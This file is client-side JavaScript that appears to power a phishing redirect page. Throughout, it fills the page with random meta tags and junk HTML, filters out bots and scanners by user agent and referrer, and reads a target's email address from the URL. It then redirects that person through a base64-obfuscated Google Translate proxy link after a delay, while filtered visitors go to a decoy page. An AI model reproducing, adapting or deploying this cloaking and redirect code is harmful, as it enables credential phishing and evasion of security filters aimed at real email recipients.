function getRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
  }
  
  function addRandomMetaTags() {
    const headElement = document.head;
    const existingMetaTags = headElement.querySelectorAll('meta');
  
    const randomTitle = getRandomString(10);
    const randomDescription = getRandomString(30);
    const randomAuthor = getRandomString(8);
    const randomImage = 'https://github.io/' + getRandomString(8) + '.jpg';
  
    function isUnique(value) {
      for (const metaTag of existingMetaTags) {
        if (metaTag.content === value) {
          return false;
        }
      }
      return true;
    }
  
    if (isUnique(randomTitle)) {
      const titleMetaTag = document.createElement('meta');
      titleMetaTag.setAttribute('property', 'og:title');
      titleMetaTag.content = randomTitle;
      headElement.appendChild(titleMetaTag);
    }
  
    if (isUnique(randomDescription)) {
      const descriptionMetaTag = document.createElement('meta');
      descriptionMetaTag.setAttribute('name', 'description');
      descriptionMetaTag.content = randomDescription;
      headElement.appendChild(descriptionMetaTag);
    }
  
    if (isUnique(randomAuthor)) {
      const authorMetaTag = document.createElement('meta');
      authorMetaTag.setAttribute('name', 'author');
      authorMetaTag.content = randomAuthor;
      headElement.appendChild(authorMetaTag);
    }
  
    if (isUnique(randomImage)) {
      const imageMetaTag = document.createElement('meta');
      imageMetaTag.setAttribute('property', 'og:image');
      imageMetaTag.content = randomImage;
      headElement.appendChild(imageMetaTag);
    }
  
  
  }
  
  addRandomMetaTags();
  
  fetch('blog.txt').then(response => response.text()).then(blogContent => document.getElementById('blog').innerHTML = blogContent);
  
  const tags = ['p', 'h1', 'div', 'a', 'img', 'ul', 'li', 'span', 'button', 'table', 'tr', 'td'];
  function generateRandomText(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let text = '';
    for (let i = 0; i < length; i++) {
      text += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return text;
  }
  function generateRandomHtml() {
    let html = '';
    const numTags = Math.floor(Math.random() * 20) + 1;
    for (let i = 0; i < numTags; i++) {
      const tag = tags[Math.floor(Math.random() * tags.length)];
      const attributes = [
        { name: 'class', value: generateRandomText(8) },
        { name: 'id', value: generateRandomText(8) },
        { name: 'data', value: generateRandomText(8) },
      ];
      let tagHtml = `<${tag}`;
      attributes.forEach(attr => {
        tagHtml += ` ${attr.name}="${attr.value}"`;
      });
      tagHtml += '>';
      if (tag === 'img') {
        tagHtml = `<${tag} src="https://via.placeholder.com/150" width="${Math.floor(Math.random() * 500) + 100}" height="${Math.floor(Math.random() * 500) + 100}"`;
        attributes.filter(attr => attr.name !== 'src').forEach(attr => {
          tagHtml += ` ${attr.name}="${attr.value}"`;
        });
        tagHtml += '>';
      } else if (tag === 'table') {
        const numRows = Math.floor(Math.random() * 5) + 1;
        const numCols = Math.floor(Math.random() * 5) + 1;
        tagHtml += '<tbody>';
        for (let r = 0; r < numRows; r++) {
          tagHtml += '<tr>';
          for (let c = 0; c < numCols; c++) {
            tagHtml += `<td>${generateRandomText(10)}</td>`;
          }
          tagHtml += '</tr>';
        }
        tagHtml += '</tbody></table>';
      } else {
        const numWords = Math.floor(Math.random() * 20) + 1;
        for (let w = 0; w < numWords; w++) {
          tagHtml += `${generateRandomText(5)} `;
        }
        tagHtml = tagHtml.trim();
        tagHtml += `</${tag}>`;
      }
      html += tagHtml;
    }
    return html;
  }
  document.write(generateRandomHtml());

  function hideTranslateBar() {
      var iframe = document.getElementById("gt-nvframe");
      if (iframe) {
        iframe.style.display = "none";
      }
    }
    function waitForTranslateBar() {
      var intervalId = setInterval(function() {
        var iframe = document.getElementById("gt-nvframe");
        if (iframe) {
          clearInterval(intervalId);
          hideTranslateBar();
        }
      }, 100);
    }
    
    waitForTranslateBar();
    
    function isValidEmail(email) {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}(?:\.[^\s@]{2,})?$/;
      return emailRegex.test(email);
    }
    (async () => {
      const useragentFile = await fetch('ugt.txt').then((response) => response.text());
      const useragentRegexes = useragentFile.split('\n').filter((line) => line.trim() !== '').map((line) => new RegExp(line, 'i'));
      const userAgentString = navigator.userAgent;
      const isBot = useragentRegexes.some((regex) => regex.test(userAgentString));
    
      const refererFile = await fetch('d.txt').then((response) => response.text());
      const refererRegexes = refererFile.split('\n').filter((line) => line.trim() !== '').map((line) => new RegExp(line, 'i'));
      const refererString = document.referrer;
      const isRefererMatch = refererRegexes.some((regex) => regex.test(refererString));
    
      const uidParam = new URLSearchParams(window.location.search).get('i');
  
      //var decString = atob(uidParam);
      var decString = uidParam;
      const isValidEmailInput = isValidEmail(decString);

      const hasMatch = isBot || isRefererMatch || !isValidEmailInput;
      if (hasMatch) {
        excvbnmq(false);
      } else {
        excvbnmq(true);
      }
    })();
        function excvbnmq(isTrue) {
          if (isTrue) {
          var queryString = window.location.search;
          var urlParams = new URLSearchParams(queryString);
          var oxx = btoa(urlParams.get('i'));
          var hos = window.location.hostname;
          var dmainParts = hos.split('.').reverse();
          var subdom = dmainParts.slice(2).reverse().join('-');
          var dmain = `${subdom}-${dmainParts[1]}-${dmainParts[0]}`;
          if (dmain.includes("-translate-goog")) {
            dmain = dmain.replace("-translate-goog", "");
          }
  
          var randmd5; fetch('md5.txt').then(response => response.text()).then(fileContents => randmd5 = fileContents.trim().split('\n').filter(md5 => md5.trim() !== '')[Math.floor(Math.random() * fileContents.trim().split('\n').filter(md5 => md5.trim() !== '').length)]);
          
          setTimeout(function() {
            var url = "https://" + dmain + atob('LnRyYW5zbGF0ZS5nb29nLw==') + randmd5 + atob('Lz94PQ==') + oxx + atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=');
            window.location.replace(url);
        }, 10000);
          } else {
            setTimeout(function() {
              window.location.replace(atob('aHR0cHM6Ly91bnN1YnNjcmliZS5naXRodWIuaW8v'));
          }, 500);
          }
      }